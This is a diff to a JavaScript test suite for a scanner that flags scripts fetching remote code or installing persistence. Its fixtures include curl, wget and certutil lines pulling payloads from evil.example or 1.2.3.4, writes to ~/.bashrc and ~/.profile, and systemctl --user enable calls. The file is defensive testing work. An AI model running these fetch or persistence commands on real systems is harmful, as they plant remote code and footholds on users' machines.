@@ -173,6 +173,7 @@ test('shell commands fetching or handing off code, in a script\'s strings', () =
   assert.deepEqual(found('login.csh', 'echo "/tmp/x" >> ~/.bashrc\n'), { persistence: [1] })
   assert.deepEqual(found('setup.sh', 'curl -fsSL \\\n  https://evil.example/p -o /tmp/p\n'), { shell: [1] }, 'a line continued')
   assert.deepEqual(found('setup.sh', 'curl\\\n  https://evil.example/p -o /tmp/p\n'), { shell: [1] }, 'continued right after the program')
+  assert.deepEqual(found('setup.sh', `curl -H "Authorization: Bearer ${'x'.repeat(1500)}" https://evil.example/p\n`), { shell: [1] }, 'long options before the URL')
   assert.deepEqual(found('a.js', 'exec("curl https:\\/\\/evil.example/x")\nspawn("curl", ["https:\\/\\/evil.example/x"])\n'), { shell: [1, 2] }, 'a URL\'s slashes escaped')
   assert.deepEqual(found('setup.sh', 'curl ftp://evil.example/p -o /tmp/p\nwget sftp://evil.example/q\n'), { shell: [1, 2] }, 'a URL fetched over FTP')
   assert.deepEqual(found('setup.bat', 'certutil -f ^\r\n  -urlcache http://1.2.3.4/x.exe x.exe\r\n'), { shell: [1] }, 'cmd\'s line continued')
@@ -220,14 +221,15 @@ test('places code runs from again later: rc files, LaunchAgents, systemd user un
     'a directory and its file named apart, as path.join takes them')
   assert.deepEqual(found('a.js', 'join(root, ".vscode", "tasks.json")\n'), { persistence: [1] })
   assert.deepEqual(found('a.js', 'const unit = join(home, ".config", "systemd",\n  "user", "x.service")\n'), { persistence: [1] }, 'a place\'s parts one after the other')
-  assert.deepEqual(found('a.js', 'spawn("systemctl", ["--user", "enable", "x.service"])\nexecFile("/usr/bin/systemctl", ["--user", "start", unit])\n'), { persistence: [1, 2] },
+  assert.deepEqual(found('a.js', 'spawn("systemctl", ["--user", "enable", "x.service"])\nexecFile("/usr/bin/systemctl", ["--user", "enable", unit])\n'), { persistence: [1, 2] },
     'a command run with its arguments apart')
-  assert.deepEqual(found('a.js', 'exec("systemctl --user --now enable x.service")\nexec("systemctl --now --user start x")\nspawn("systemctl", ["--user", "--now", "enable", unit])\n'),
+  assert.deepEqual(found('a.js', 'exec("systemctl --user --now enable x.service")\nexec("systemctl --now --user enable x")\nspawn("systemctl", ["--user", "--now", "enable", unit])\n'),
     { persistence: [1, 2, 3] }, 'systemctl\'s other options before its command')
   assert.deepEqual(found('a.js', 'exec("systemctl enable --user x.service")\nspawn("systemctl", ["enable", unit, "--user"])\n'), { persistence: [1, 2] }, '--user after its command')
   assert.equal(found('setup.sh', 'systemctl start nginx\necho --user\nsystemctl enable nginx; echo --user\nsystemctl start nginx | grep --user\n'), null, '--user on another line, or in another command')
   assert.equal(found('setup.sh', 'printf payload | env\nbash local.sh\n'), null, 'env and a shell on separate lines')
-  assert.equal(found('setup.sh', 'systemctl --user\nenable x\nsystemctl\n--user\nstart x\n'), null, 'its options and command on other lines')
+  assert.equal(found('setup.sh', 'systemctl --user\nenable x\nsystemctl\n--user\nenable y\n'), null, 'its options and command on other lines')
+  assert.equal(found('setup.sh', 'systemctl --user start x.service\nsystemctl start --user y\n'), null, 'a unit started once, not enabled')
   assert.deepEqual(found('setup.sh', 'systemctl --user \\\n  enable x\n'), { persistence: [1] }, 'its line continued')
   assert.deepEqual(found('a.js', 'const files = [\n  "notes.txt",\n  ".bashrc",\n]\n'), { persistence: [3] }, 'a part naming a place alone, where it is')
   assert.deepEqual(found('a.js', 'writeFileSync(home + "/.profile", payload)\nexec("echo x >> ~/.profile")\njoin("/home/x", ".profile")\nwriteFileSync(join(home, ".bash_login"), p)\nexec("echo x >> ~/.zshenv")\nwriteFileSync(path.join(os.homedir(), \'.profile\'), p)\nresolve(process.env.HOME, ".profile")\n'), { persistence: [1, 2, 3, 4, 5, 6, 7] },
